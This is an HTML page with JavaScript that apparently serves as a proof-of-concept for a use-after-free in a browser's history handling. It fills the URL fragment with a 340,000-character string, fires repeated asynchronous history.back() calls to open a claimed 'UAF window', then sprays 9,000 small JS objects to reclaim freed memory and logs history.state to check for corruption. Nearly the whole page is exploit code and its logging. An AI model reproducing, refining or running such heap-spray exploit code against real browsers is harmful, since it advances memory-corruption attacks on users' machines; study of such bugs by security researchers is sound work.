<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Slot Fixation V3 – REAL UAF</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { font-size:16px; margin:4px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h2>Slot Fixation V3 — Real UAF + JSObject Inline</h2>
<button onclick="run()">RUN</button>
<pre id="log"></pre>

<script>
function log(x){logEl.textContent+=x+"\n";}
const logEl=document.getElementById("log");

/* ---------------- SETUP LARGE FRAGMENT ---------------- */

function setupLargeFragment() {
  let big = "A".repeat(340000);
  history.replaceState({i:1},"","#"+big);
}

/* ---------------- REAL UAF TRIGGER ---------------- */

function triggerUAF(cb){
  log("=== UAF TRIGGER START ===");
  for(let i=0;i<48;i+=6){
    history.back();
    log("[ITER "+i+"] back() async");
  }
  setTimeout(()=>{
    log(">>> UAF WINDOW <<<");
    cb();
  },30);
}

/* ---------------- SLOT FIXATION ---------------- */

function sprayInline(count){
  let arr=[];
  for(let i=0;i<count;i++){
    arr.push({a:0x41,b:i&0xff});
  }
  return arr;
}

function snapshot(tag){
  try{
    log("["+tag+"] history.state = "+JSON.stringify(history.state));
    log("["+tag+"] keys = "+Object.keys(history.state));
  }catch{
    log("["+tag+"] state read error");
  }
}

/* ---------------- MAIN ---------------- */

function run(){
  logEl.textContent="";

  setupLargeFragment();

  log("=== BASELINE ===");
  log("URL.length = "+location.href.length);
  snapshot("BASE");

  triggerUAF(()=>{

    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({i:2},"","#X");
    log("URL.length = "+location.href.length);

    log("\n=== SLOT FIXATION PHASE (V3) ===");
    let spray=sprayInline(9000);
    log("Sprayed JSObjects: "+spray.length);

    log("\n=== CONTROL COLLISION ===");
    history.replaceState({ctrl:"A"},"","#A");
    history.replaceState({ctrl:"B"},"","#B");
    history.back();

    log("\n=== POST ===");
    log("URL.length = "+location.href.length);
    log("hash.length = "+location.hash.length);
    snapshot("POST");

    log("\n=== CONSISTENCY CHECK ===");
    try{
      log("Final ctrl = "+history.state.ctrl);
    }catch{
      log("Final ctrl = <exception>");
    }

    log("=== TEST END ===");
  });
}
</script>

</body>
</html>
